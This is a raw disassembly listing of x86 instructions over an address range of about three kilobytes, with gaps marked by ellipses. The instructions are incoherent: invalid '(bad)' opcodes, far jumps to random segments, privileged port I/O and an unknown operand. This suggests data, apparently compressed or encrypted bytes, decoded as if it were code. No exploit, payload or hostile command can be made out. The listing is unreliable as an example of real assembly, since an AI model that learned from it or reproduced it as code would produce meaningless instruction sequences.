  42efeb:	idiv   DWORD PTR [ebp+0x4930d9ad]
  42eff1:	in     eax,dx
  42eff2:	fnstcw WORD PTR [edi+edx*2+0x7f]
  42eff6:	or     ecx,ebx
  42eff8:	jo     0x42ef90
  42effa:	cs jb  0x42efe0
  42effd:	arpl   ax,bx
  42efff:	jns    0x42efb3
  42f001:	mov    ch,al
  42f003:	dec    edi
  42f004:	lods   al,BYTE PTR ds:[esi]
  42f005:	pop    esi
  42f006:	and    eax,DWORD PTR [esi]
  42f008:	das    
  42f009:	pop    ss
  42f00a:	int3   
  42f00b:	ins    BYTE PTR es:[edi],dx
  42f00c:	dec    edi
  42f00d:	sti    
  42f00e:	or     DWORD PTR [ebx+0xff],ebx
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	adc    bl,BYTE PTR [edi+edx*8+0x1f88149]
  42f087:	add    BYTE PTR ds:0xcc000001,al
  42f08d:	jge    0x42f01b
  42f08f:	mov    bh,0xee
  42f091:	scas   eax,DWORD PTR es:[edi]
  42f092:	sub    eax,0x7dfcb66d
  42f097:	xcrypt-cfb (bad)
  42f098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f09a:	and    esp,DWORD PTR [edi+ebx*4+0xe9d34bc]
  42f0a1:	jp     0x42f058
  42f0a3:	push   edx
  42f0a4:	or     edi,DWORD PTR [edx-0x64]
  42f0a7:	addr16 dec ebx
  42f0a9:	inc    ebx
  42f0aa:	and    BYTE PTR [esi-0x69],dh
  42f0ad:	xchg   esi,eax
  42f0ae:	imul   ebx,DWORD PTR [ecx+0x57],0x148113d8
  42f0b5:	jno    0x42f08b
  42f0b7:	sub    DWORD PTR [edx],0xc061ae14
  42f0bd:	dec    esi
  42f0be:	inc    ecx
  42f0bf:	lds    ecx,FWORD PTR gs:[edx-0x23fbaa1e]
  42f0c6:	mov    ah,0x8c
  42f0c8:	mov    al,ds:0xab08d8b
  42f0cd:	ficom  DWORD PTR [ebx+esi*4+0x72cc9ea3]
  42f0d4:	pop    ds
  42f0d5:	xchg   edx,eax
  42f0d6:	xor    ecx,DWORD PTR [ebx+0x1bfcc129]
  42f0dc:	mov    al,ds:0x1db0a8ac
  42f0e1:	pop    ebx
  42f0e2:	sbb    BYTE PTR [ecx+0xec403e9],bl
  42f0e8:	sbb    al,0x2a
  42f0ea:	sub    edx,ebx
  42f0ec:	and    BYTE PTR [esi+ecx*4],ah
  42f0ef:	popa   
  42f0f0:	ss add al,bl
  42f0f3:	gs sbb ah,bl
  42f0f6:	mov    dl,0xb0
  42f0f8:	fcom   st(6)
  42f0fa:	xor    DWORD PTR [ebp+0x6d],edx
  42f0fd:	dec    eax
  42f0fe:	shl    DWORD PTR [ebp+0x30],0xaa
  42f102:	pusha  
  42f103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f104:	repz shr DWORD PTR [ecx+esi*8-0x46],0x11
  42f10a:	retf   0x9240
  42f10d:	div    DWORD PTR [edx+0x4f]
  42f110:	mov    edx,0x8c731ca4
  42f115:	in     al,dx
  42f116:	outs   dx,BYTE PTR ds:[esi]
  42f117:	leave  
  42f118:	adc    esp,DWORD PTR [ecx]
  42f11a:	cs mov bh,0x46
  42f11d:	rcl    DWORD PTR [esi-0x6a3522b3],1
  42f123:	cld    
  42f124:	imul   esi,DWORD PTR [edi+ebp*2-0x59],0x4d5d6b97
  42f12c:	idiv   eax
  42f12e:	fist   DWORD PTR [ebx-0x5890fb46]
  42f134:	adc    eax,0x50df8200
  42f139:	nop
  42f13a:	je     0x42f0e5
  42f13c:	inc    esi
  42f13d:	dec    eax
  42f13e:	inc    esp
  42f13f:	pop    edi
  42f140:	jne    0x42f0e9
  42f142:	jp     0x42f154
  42f144:	mov    edx,0x10159fe2
  42f149:	mov    ebx,0x30e878c5
  42f14e:	test   al,0x96
  42f150:	pop    edx
  42f151:	iret   
  42f152:	fwait
  42f153:	iret   
  42f154:	push   esp
  42f155:	rol    DWORD PTR [edx+ebx*4-0x653bd552],cl
  42f15c:	adc    esi,ebx
  42f15e:	(bad)  
  42f15f:	lods   eax,DWORD PTR ds:[esi]
  42f160:	or     cl,BYTE PTR [ebx+ecx*2+0x74dd90e0]
  42f167:	and    esi,DWORD PTR [edi+0x59]
  42f16a:	call   0x6646:0x8f99b5f4
  42f171:	xor    DWORD PTR [eax+ebp*1+0x7f356a0c],ebp
  42f178:	cmp    bh,BYTE PTR [ebp-0x19629daa]
  42f17e:	cli    
  42f17f:	sti    
  42f180:	push   edi
  42f181:	push   ds
  42f182:	lods   al,BYTE PTR ds:[esi]
  42f183:	mov    BYTE PTR [edx-0x1c],0x88
  42f187:	ss and bh,ah
  42f18a:	jb     0x42f15f
  42f18c:	add    al,0x1c
  42f18e:	lea    ecx,[eax]
  42f190:	clc    
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	aam    0x2a
  42f202:	cli    
  42f203:	dec    ebp
  42f204:	xchg   cl,bh
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0x53000001
  42f20d:	pop    ebx
  42f20e:	jns    0x42f253
  42f210:	xor    DWORD PTR [ebx],edi
  42f212:	jl     0x42f1a7
  42f214:	mov    bl,0x62
  42f216:	shl    DWORD PTR [eax],0x1a
  42f219:	adc    eax,0x6cbb46af
  42f21e:	cmc    
  42f21f:	add    ecx,edi
  42f221:	call   DWORD PTR [ebp+0x76]
  42f224:	sbb    DWORD PTR [edi+eiz*8-0x5d],edx
  42f228:	inc    edx
  42f229:	repz or eax,0x1395853c
  42f22f:	xchg   ebx,eax
  42f230:	mov    ebx,0xf29b9fcb
  42f235:	int3   
  42f236:	cmp    esi,DWORD PTR [esi+0x1f]
  42f239:	pop    ecx
  42f23a:	inc    esi
  42f23b:	adc    BYTE PTR es:[edi+0x49],bh
  42f23f:	in     eax,0x16
  42f241:	dec    edi
  42f242:	enter  0x1882,0x79
  42f246:	mov    dl,0x36
  42f248:	and    eax,DWORD PTR [eax]
  42f24a:	imul   esi,DWORD PTR [eax-0x76332912],0xe544d457
  42f254:	cmp    ecx,DWORD PTR [ebp+ebp*4+0x34]
  42f258:	loopne 0x42f2a4
  42f25a:	outs   dx,DWORD PTR ds:[esi]
  42f25b:	aam    0x6c
  42f25d:	clc    
  42f25e:	scas   eax,DWORD PTR es:[edi]
  42f25f:	test   DWORD PTR [edx-0x735c358b],edi
  42f265:	adc    DWORD PTR [edx+0x3e],ebp
  42f268:	cmp    cl,ah
  42f26a:	pop    edi
  42f26b:	pushf  
  42f26c:	mov    edx,0xd7e16de
  42f271:	pop    edx
  42f272:	inc    ebp
  42f273:	fmul   QWORD PTR [edi]
  42f275:	xor    DWORD PTR [eax],ebx
  42f277:	pusha  
  42f278:	lods   eax,DWORD PTR ds:[esi]
  42f279:	push   edi
  42f27a:	cli    
  42f27b:	test   eax,0xd45caef3
  42f280:	pop    edi
  42f281:	cmp    bl,BYTE PTR [ebx-0x7c]
  42f284:	iret   
  42f285:	jmp    0xbb1c:0xd5346e86
  42f28c:	test   DWORD PTR [esi-0x35e2cfd6],eax
  42f292:	sbb    edx,ecx
  42f294:	popf   
  42f295:	jge    0x42f2c0
  42f297:	int    0x14
  42f299:	xor    edi,ecx
  42f29b:	push   ds
  42f29c:	dec    eax
  42f29d:	push   ecx
  42f29e:	sub    bl,BYTE PTR [ecx]
  42f2a0:	fwait
  42f2a1:	dec    edx
  42f2a2:	xchg   esi,eax
  42f2a3:	push   ebp
  42f2a4:	inc    ebx
  42f2a5:	dec    esp
  42f2a6:	aas    
  42f2a7:	sub    al,ah
  42f2a9:	stc    
  42f2aa:	xor    esi,esp
  42f2ac:	push   edx
  42f2ad:	jmp    DWORD PTR [esp+eiz*8]
  42f2b0:	ret    
  42f2b1:	jb     0x42f261
  42f2b3:	add    al,0x4d
  42f2b5:	adc    eax,0x4c91bfa0
  42f2ba:	in     eax,dx
  42f2bb:	cmp    dh,bl
  42f2bd:	push   ss
  42f2be:	imul   edi,DWORD PTR [esi],0xffffffef
  42f2c1:	and    edi,eax
  42f2c3:	mov    cl,bh
  42f2c5:	gs int3 
  42f2c7:	add    BYTE PTR [eax+0x4352b8e4],dh
  42f2cd:	sbb    al,0x6c
  42f2cf:	cmc    
  42f2d0:	or     al,0x82
  42f2d2:	shr    ebx,0x82
  42f2d5:	mov    ch,0xaa
  42f2d7:	out    0x4b,al
  42f2d9:	out    0x54,eax
  42f2db:	jp     0x42f2b4
  42f2dd:	cmp    cl,dh
  42f2df:	mov    dh,0xd0
  42f2e1:	or     bh,BYTE PTR [eax-0xc9e64eb]
  42f2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2e8:	cmp    BYTE PTR [edx],bl
  42f2ea:	push   ecx
  42f2eb:	loope  0x42f2fa
  42f2ed:	test   al,0xdd
  42f2ef:	pop    ebx
  42f2f0:	inc    edx
  42f2f1:	hlt    
  42f2f2:	mov    bl,BYTE PTR [ecx-0x7c]
  42f2f5:	jmp    0xa27d:0x8fa7d4d5
  42f2fc:	fnstsw WORD PTR [esi-0x53f0910d]
  42f302:	lods   eax,DWORD PTR ds:[esi]
  42f303:	mov    cs,ecx
  42f305:	adc    eax,0x3ae84904
  42f30a:	mov    edi,0x35ba4291
  42f30f:	push   eax
  42f310:	mov    eax,0x0
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	fidivr DWORD PTR [edi-0x57470f5]
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x73000001
  42f38d:	arpl   di,cx
  42f38f:	xor    DWORD PTR [ecx],edi
  42f391:	fist   WORD PTR [ebx+0x61bacddf]
  42f397:	mov    ecx,0xdfd39a01
  42f39c:	mov    BYTE PTR [edi+ebp*2],dh
  42f39f:	in     eax,dx
  42f3a0:	jb     0x42f3be
  42f3a2:	pop    ebx
  42f3a3:	mov    esi,0x9d0d3bd0
  42f3a8:	ins    BYTE PTR es:[edi],dx
  42f3a9:	rol    edx,0x4e
  42f3ac:	retf   0x6ea2
  42f3af:	std    
  42f3b0:	mov    esp,DWORD PTR [edi]
  42f3b2:	mov    DWORD PTR [esi],ebp
  42f3b4:	push   ebp
  42f3b5:	jle    0x42f353
  42f3b7:	lock jo 0x42f38d
  42f3ba:	loopne 0x42f41d
  42f3bc:	sahf   
  42f3bd:	add    DWORD PTR [ebx+edi*4-0x55e6c73a],0x430edf26
  42f3c8:	adc    eax,0x88feef8d
  42f3cd:	push   edx
  42f3ce:	fidivr DWORD PTR [ecx]
  42f3d0:	les    ebp,FWORD PTR [ebx]
  42f3d2:	test   eax,0xbd23114a
  42f3d7:	sub    al,0x89
  42f3d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3da:	leave  
  42f3db:	(bad)  
  42f3dc:	clc    
  42f3dd:	fldcw  WORD PTR [eax+0x45]
  42f3e0:	mov    eax,0xd11da824
  42f3e5:	or     eax,0xb0a6abcf
  42f3ea:	scas   eax,DWORD PTR es:[edi]
  42f3eb:	mov    esi,0xab2f091b
  42f3f0:	inc    eax
  42f3f1:	jbe    0x42f404
  42f3f3:	(bad)  
  42f3f4:	xchg   cl,al
  42f3f6:	out    0x81,al
  42f3f8:	mov    edx,0x2c35fc7
  42f3fd:	clc    
  42f3fe:	inc    ebp
  42f3ff:	loopne 0x42f3d6
  42f401:	call   FWORD PTR [eax-0x6218d408]
  42f407:	xchg   DWORD PTR [ecx+0x39],edi
  42f40a:	mov    DWORD PTR [ecx-0x23],eax
  42f40d:	pop    eax
  42f40e:	or     al,0x52
  42f410:	std    
  42f411:	cmp    DWORD PTR [edi],eax
  42f413:	lahf   
  42f414:	push   edi
  42f415:	clc    
  42f416:	rcr    BYTE PTR [esi],1
  42f418:	or     esp,DWORD PTR [ebx+edx*4+0x3d77b848]
  42f41f:	xchg   BYTE PTR [esi-0x64],dh
  42f422:	icebp  
  42f423:	push   ds
  42f424:	cs xor esi,ebx
  42f427:	add    ch,bh
  42f429:	or     BYTE PTR [eax-0x21627869],ah
  42f42f:	mov    dh,0x69
  42f431:	daa    
  42f432:	cmp    eax,0x6fc818c2
  42f437:	test   eax,0xb3061cbb
  42f43c:	add    cl,BYTE PTR [eax+0x6148d56f]
  42f442:	fimul  WORD PTR [ebx+0x1c545b3b]
  42f448:	dec    ebp
  42f449:	add    BYTE PTR [edi-0xa34d397],cl
  42f44f:	xchg   edi,eax
  42f450:	je     0x42f48a
  42f452:	idiv   bl
  42f454:	mov    eax,0xd6096602
  42f459:	sub    BYTE PTR fs:[eax],dl
  42f45c:	out    0x6c,eax
  42f45e:	jnp    0x42f476
  42f460:	icebp  
  42f461:	pop    ebp
  42f462:	sbb    edi,DWORD PTR [eax]
  42f464:	jmp    0x4477:0x7991c8e3
  42f46b:	cwde   
  42f46c:	jecxz  0x42f473
  42f46e:	nop
  42f46f:	cdq    
  42f470:	mov    bl,0x50
  42f472:	out    0x3e,al
  42f474:	addr16 gs xor eax,0x5b73927c
  42f47b:	xchg   DWORD PTR [edi-0x46],ebp
  42f47e:	loopne 0x42f45f
  42f480:	dec    esi
  42f481:	dec    ebx
  42f482:	aaa    
  42f483:	test   BYTE PTR ds:0x829ff12d,0xa6
  42f48a:	jecxz  0x42f4e0
  42f48c:	mov    ebp,0xa1b234dc
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	repz aas 
  42f502:	cmp    BYTE PTR [edi-0x70],dh
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0xec000001
  42f50d:	mov    ecx,0xf4d40328
  42f512:	cwde   
  42f513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f514:	add    ebx,esi
  42f516:	mov    al,0x1c
  42f518:	cld    
  42f519:	pop    ebx
  42f51a:	out    dx,eax
  42f51b:	ss in  eax,dx
  42f51d:	dec    eax
  42f51e:	imul   ebp,DWORD PTR [eax+eax*2-0x577ce2f3],0x17
  42f526:	inc    esp
  42f527:	mov    bl,0xfc
  42f529:	push   edx
  42f52a:	cmovno ecx,DWORD PTR [ebp-0x280ef4ee]
  42f531:	(bad)  
  42f534:	dec    edx
  42f535:	pop    ds
  42f536:	and    eax,0x86723c7c
  42f53b:	daa    
  42f53c:	cmp    eax,DWORD PTR [ebx-0x75]
  42f53f:	jmp    0x9860c83e
  42f544:	push   0xa12695fb
  42f549:	loopne 0x42f531
  42f54b:	xchg   DWORD PTR [esi-0x4cefafc4],ebx
  42f551:	add    BYTE PTR [esp+ebp*4+0x6f],0xa7
  42f556:	inc    edx
  42f557:	or     al,0xf6
  42f559:	jbe    0x42f5a8
  42f55b:	sub    eax,0xca0d6b3e
  42f560:	adc    eax,ecx
  42f562:	aaa    
  42f563:	(bad)  
  42f564:	(bad)  
  42f565:	sbb    DWORD PTR [ebx+0x6b],0xffffffc7
  42f569:	pop    edi
  42f56a:	or     ah,BYTE PTR [ebp-0x45]
  42f56d:	(bad)  
  42f56e:	fisub  DWORD PTR [edi+0x67dbe9ca]
  42f574:	ret    
  42f575:	dec    ebx
  42f576:	bound  ebx,QWORD PTR [ecx+0x4e]
  42f579:	(bad)  
  42f57a:	mov    dl,0xcb
  42f57c:	add    al,0xee
  42f57e:	dec    esp
  42f57f:	sbb    BYTE PTR ds:0xd8dca419,dh
  42f585:	sbb    eax,0xa6057377
  42f58a:	lock mov edx,0xe497274
  42f590:	dec    ecx
  42f591:	scas   al,BYTE PTR es:[edi]
  42f592:	idiv   DWORD PTR [edx]
  42f594:	test   al,0x70
  42f596:	sbb    BYTE PTR [edi-0x29e075a6],dh
  42f59c:	lahf   
  42f59d:	clc    
  42f59e:	sti    
  42f59f:	jg     0x42f585
  42f5a1:	inc    eax
  42f5a2:	sub    ecx,ecx
  42f5a4:	dec    esi
  42f5a5:	in     eax,dx
  42f5a6:	mov    dh,0x4c
  42f5a8:	sub    DWORD PTR [ebx],eax
  42f5aa:	cmp    eax,0x84cc52e3
  42f5af:	pop    ss
  42f5b0:	jecxz  0x42f532
  42f5b2:	jbe    0x42f5df
  42f5b4:	adc    dl,BYTE PTR ds:0x3b4ec513
  42f5ba:	mov    dh,0xb9
  42f5bc:	inc    edi
  42f5bd:	push   0x1eff5da1
  42f5c2:	imul   esi,DWORD PTR [eax],0xd0945b4
  42f5c8:	ret    0x9d28
  42f5cb:	or     al,0x4
  42f5cd:	mov    cl,0x44
  42f5cf:	fwait
  42f5d0:	mov    edx,0xd9817149
  42f5d5:	fstp   DWORD PTR [ecx+0x11]
  42f5d8:	js     0x42f5ef
  42f5da:	leave  
  42f5db:	test   BYTE PTR [ebp-0x6a828668],al
  42f5e1:	(bad)  
  42f5e2:	xchg   edx,eax
  42f5e3:	push   esi
  42f5e4:	(bad)  
  42f5e5:	lea    esi,[eax+0x32]
  42f5e8:	(bad)  
  42f5ea:	(bad)  
  42f5eb:	cli    
  42f5ec:	mov    ecx,0x430f6189
  42f5f1:	xor    BYTE PTR [eax],0x48
  42f5f4:	lahf   
  42f5f5:	jne    0x42f5e2
  42f5f7:	loope  0x42f638
  42f5f9:	test   al,0x2d
  42f5fb:	pop    esp
  42f5fc:	jg     0x42f609
  42f5fe:	not    BYTE PTR [ebx-0xa985679]
  42f604:	or     al,0x21
  42f606:	je     0x42f599
  42f608:	push   0x12
  42f60a:	xor    dl,dl
  42f60c:	dec    edx
  42f60d:	xchg   esp,eax
  42f60e:	out    dx,eax
  42f60f:	pushf  
  42f610:	lods   al,BYTE PTR ds:[esi]
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	sub    eax,0x95635e18
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0x69000001
  42f68d:	xor    DWORD PTR [edx+edi*4],edx
  42f690:	cmp    al,0xab
  42f692:	scas   al,BYTE PTR es:[edi]
  42f693:	loop   0x42f61e
  42f695:	adc    dh,BYTE PTR [eax+0x27]
  42f698:	mov    ebp,0xfed9e4f7
  42f69d:	(bad)  
  42f69e:	mov    bl,0x3a
  42f6a0:	(bad)  
  42f6a1:	jl     0x42f6a1
  42f6a3:	repnz and BYTE PTR [eax-0x52d7b042],ah
  42f6aa:	cmp    ebp,DWORD PTR [ecx-0x49]
  42f6ad:	sbb    DWORD PTR [edi],edi
  42f6af:	sub    DWORD PTR [ebx+0x40],ebp
  42f6b2:	rcl    DWORD PTR [ecx-0x2ec74f1f],1
  42f6b8:	cs jo  0x42f661
  42f6bb:	repnz mov WORD PTR [esi],ss
  42f6be:	out    0x50,eax
  42f6c0:	lds    ebp,FWORD PTR [eax]
  42f6c2:	out    0xe9,al
  42f6c4:	or     esi,esp
  42f6c6:	pop    ebx
  42f6c7:	xchg   esp,eax
  42f6c8:	std    
  42f6c9:	mov    eax,ds:0xa17e90c2
  42f6ce:	repnz mov al,bh
  42f6d1:	dec    esp
  42f6d2:	lods   al,BYTE PTR ds:[esi]
  42f6d3:	adc    ah,BYTE PTR [ecx]
  42f6d5:	and    DWORD PTR [edx-0x7f],eax
  42f6d8:	inc    edx
  42f6d9:	and    al,0xb4
  42f6db:	pop    esi
  42f6dc:	ins    BYTE PTR es:[edi],dx
  42f6dd:	mov    ah,0xd1
  42f6df:	fdiv   DWORD PTR [eax-0x68]
  42f6e2:	pop    ecx
  42f6e3:	inc    ebp
  42f6e4:	test   BYTE PTR [esi+ebp*1+0xd],dl
  42f6e8:	xchg   edx,eax
  42f6e9:	test   DWORD PTR [ebp-0x55996bbe],esp
  42f6ef:	push   edi
  42f6f0:	shl    ch,cl
  42f6f2:	push   es
  42f6f3:	inc    ebx
  42f6f4:	push   ds
  42f6f5:	mov    eax,0x1e04e4a3
  42f6fa:	inc    ebp
  42f6fb:	loopne 0x42f690
  42f6fd:	add    ebx,DWORD PTR [ecx]
  42f6ff:	lea    ebx,[eax+0x58]
  42f702:	mov    ebx,0xc327f12c
  42f707:	push   eax
  42f708:	xor    DWORD PTR [esi],eax
  42f70a:	mov    BYTE PTR [eax-0x63],dh
  42f70d:	push   0x53
  42f70f:	jg     0x42f6be
  42f711:	and    al,0xb2
  42f713:	add    DWORD PTR [eax],esi
  42f715:	sub    eax,DWORD PTR [eax-0x12dd13e2]
  42f71b:	xchg   DWORD PTR [esi-0xbb5afc4],esi
  42f721:	nop
  42f722:	and    al,0x2
  42f724:	and    edx,DWORD PTR [ecx+edi*2+0x7842a592]
  42f72b:	xchg   edi,eax
  42f72c:	push   ss
  42f72d:	mov    esp,0x591db0d7
  42f732:	(bad)  
  42f734:	int    0xe6
  42f736:	xor    BYTE PTR [ebp-0x3de2cb],cl
  42f73c:	and    BYTE PTR [ebp+0x67abbb40],ah
  42f742:	sbb    eax,0xd24d1c03
  42f747:	sub    BYTE PTR [ecx-0x36f39bad],0xac
  42f74e:	test   eax,0xf11d0327
  42f753:	inc    esi
  42f754:	jnp    0x42f789
  42f756:	sbb    eax,0x5687c2bb
  42f75b:	aad    0xf9
  42f75d:	div    DWORD PTR [edx-0x58]
  42f760:	xchg   ecx,eax
  42f761:	hlt    
  42f762:	push   ss
  42f763:	iret   
  42f764:	ffree  st(3)
  42f766:	pop    ss
  42f767:	add    DWORD PTR ds:0xa6828761,ebp
  42f76d:	lock dec esi
  42f76f:	and    al,0xa5
  42f771:	fnstcw WORD PTR ds:0xb73343e0
  42f777:	cmp    bh,dh
  42f779:	in     eax,dx
  42f77a:	mov    WORD PTR cs:[eax+0xf],fs
  42f77e:	js     0x42f7cb
  42f780:	lahf   
  42f781:	mov    dh,0xf0
  42f783:	xchg   BYTE PTR [ecx+eiz*2],dh
  42f786:	push   0xffffffb3
  42f788:	in     al,dx
  42f789:	dec    ecx
  42f78a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f78b:	sub    eax,0xdb684b15
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x2f8b9d80
  42f804:	call   0x1:0x50001fd
  42f80b:	add    cl,al
  42f80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f80e:	fsubr  st(5),st
  42f810:	pop    ss
  42f811:	mov    ch,0x78
  42f813:	add    DWORD PTR [ebx-0x4b],0x3d080532
  42f81a:	dec    ebx
  42f81b:	(bad)  
  42f81c:	ficomp WORD PTR [ebp-0x440b73dc]
  42f822:	mov    dl,0x58
  42f824:	ror    BYTE PTR [ecx+0x25137734],0xf8
  42f82b:	fmul   DWORD PTR [ebp-0xc4a1039]
  42f831:	ds mov cl,ah
  42f834:	sbb    esp,edi
  42f836:	repnz xchg edx,eax
  42f838:	mov    esi,edi
  42f83a:	mov    ch,BYTE PTR [edi]
  42f83c:	pop    edi
  42f83d:	ret    
  42f83e:	mov    ecx,0xbd4fd6b2
  42f843:	dec    ecx
  42f844:	pmaxsw mm1,mm3
  42f847:	pushf  
  42f848:	lds    ebx,FWORD PTR [edx-0x32f3d56f]
  42f84e:	push   ecx
  42f84f:	push   0xffffff85
  42f851:	jl     0x42f7f9
  42f853:	scas   eax,DWORD PTR es:[edi]
  42f854:	jmp    0xfbd2:0xaf534e39
  42f85b:	xchg   ebx,eax
  42f85c:	loope  0x42f868
  42f85e:	call   0x64b7:0x6f88e458
  42f865:	sub    al,0x8b
  42f867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f868:	xchg   ebx,ebx
  42f86a:	xor    cl,BYTE PTR [edi]
  42f86c:	add    ebx,ecx
  42f86e:	xchg   ebp,eax
  42f86f:	clc    
  42f870:	lea    ebp,[ecx+ebx*2+0x372231b8]
  42f877:	mov    edi,0xe3552334
  42f87c:	xor    ah,cl
  42f87e:	xchg   DWORD PTR ds:0x415dd647,ecx
  42f884:	adc    eax,0xdf0bc3f3
  42f889:	inc    esi
  42f88a:	or     eax,0x51d235b6
  42f88f:	popf   
  42f890:	jnp    0x42f892
  42f892:	aas    
  42f893:	cli    
  42f894:	dec    eax
  42f895:	or     ah,ah
  42f897:	mov    ds:0x8f741f0b,eax
  42f89c:	fbld   TBYTE PTR [ebp+0x2061150c]
  42f8a2:	push   es
  42f8a3:	push   ss
  42f8a4:	jge    0x42f8a6
  42f8a6:	mov    eax,es:0x38cee8a5
  42f8ac:	dec    eax
  42f8ad:	xchg   ebx,eax
  42f8ae:	push   esi
  42f8af:	fcomp  st(6)
  42f8b1:	fwait
  42f8b2:	stos   BYTE PTR es:[edi],al
  42f8b3:	inc    eax
  42f8b4:	cmp    ebx,ebp
  42f8b6:	jmp    0x5a3ae077
  42f8bb:	sub    al,0x14
  42f8bd:	pop    ebp
  42f8be:	popa   
  42f8bf:	repz fwait
  42f8c1:	fwait
  42f8c2:	in     eax,0x22
  42f8c4:	jns    0x42f907
  42f8c6:	out    dx,al
  42f8c7:	mov    dh,0x8b
  42f8c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8ca:	push   ebp
  42f8cb:	xchg   esi,eax
  42f8cc:	cmp    al,0xa1
  42f8ce:	jne    0x42f8fe
  42f8d0:	mov    edx,0x5d5955d3
  42f8d5:	jne    0x42f8aa
  42f8d7:	jg     0x42f874
  42f8d9:	arpl   WORD PTR [ebx-0xe],cx
  42f8dc:	jmp    0x3da2:0x2e33f8da
  42f8e3:	and    al,0x9
  42f8e5:	lock add al,0x38
  42f8e8:	loope  0x42f8a5
  42f8ea:	bound  eax,QWORD PTR [ebx-0x805239d]
  42f8f0:	or     eax,0xf6a0c255
  42f8f5:	pop    esi
  42f8f6:	imul   ecx,esp,0x60
  42f8f9:	mov    ds:0xfeb73dc7,al
  42f8fe:	adc    BYTE PTR [eax+eiz*2-0x52e8446],bh
  42f905:	mov    BYTE PTR [ebx-0x624b94cb],bh
  42f90b:	adc    BYTE PTR [ebx-0x511298e3],dl
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9ed
  42f981:	adc    eax,0xfe9f14df
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    eax,0xc8000001
  42f98d:	jno    0x42f982
  42f98f:	jns    0x42f9c1
  42f991:	lods   eax,DWORD PTR ds:[esi]
  42f992:	jnp    0x42f94f
  42f994:	sub    DWORD PTR [esi+0x13fb3188],0xffffff97
  42f99b:	cdq    
  42f99c:	dec    ebp
  42f99d:	test   eax,0x171d50a3
  42f9a2:	jae    0x42f952
  42f9a4:	test   al,0x18
  42f9a6:	adc    eax,0xe1ccea84
  42f9ab:	dec    esp
  42f9ac:	loop   0x42f965
  42f9ae:	mov    BYTE PTR [ebx],ch
  42f9b0:	(bad)  
  42f9b1:	push   ds
  42f9b2:	push   ss
  42f9b3:	int3   
  42f9b4:	ret    
  42f9b5:	xor    BYTE PTR [edx-0x1a],dl
  42f9b8:	xchg   ebp,eax
  42f9b9:	add    esp,DWORD PTR [esp+esi*8-0x44eac9e1]
  42f9c0:	xchg   ebx,eax
  42f9c1:	bnd jo 0x42f954
  42f9c4:	div    DWORD PTR cs:[edx-0x2787b4e7]
  42f9cb:	sbb    DWORD PTR [edx],edi
  42f9cd:	and    esi,DWORD PTR [edi+0x4a3a8b4b]
  42f9d3:	adc    cl,cl
  42f9d5:	push   ebp
  42f9d6:	push   ebx
  42f9d7:	aas    
  42f9d8:	sbb    eax,0x7a79d11
  42f9dd:	and    DWORD PTR [edx-0x3d732b84],eax
  42f9e3:	fs inc edx
  42f9e5:	cmp    ebp,DWORD PTR [edi+0x20]
  42f9e8:	test   ah,0xa0
  42f9eb:	std    
  42f9ec:	shr    BYTE PTR [esi-0x25a3d9a9],0xa3
  42f9f3:	pop    es
  42f9f4:	imul   eax,ebp,0xa7ec9fb0
  42f9fa:	xchg   edx,esp
  42f9fc:	mov    ?,WORD PTR [esi+0xc]
  42f9ff:	neg    ecx
  42fa01:	lea    ecx,[esi+0x5a]
  42fa04:	daa    
  42fa05:	cmp    dl,BYTE PTR [edx]
  42fa07:	inc    esp
  42fa08:	pop    es
  42fa09:	mov    bh,0xe
  42fa0b:	mov    DWORD PTR [edx-0x4b],ebx
  42fa0e:	bound  edi,QWORD PTR [esi]
  42fa10:	or     DWORD PTR [esi],esp
  42fa12:	mov    al,0x9e
  42fa14:	mov    BYTE PTR [edi-0x418ffce3],0xde
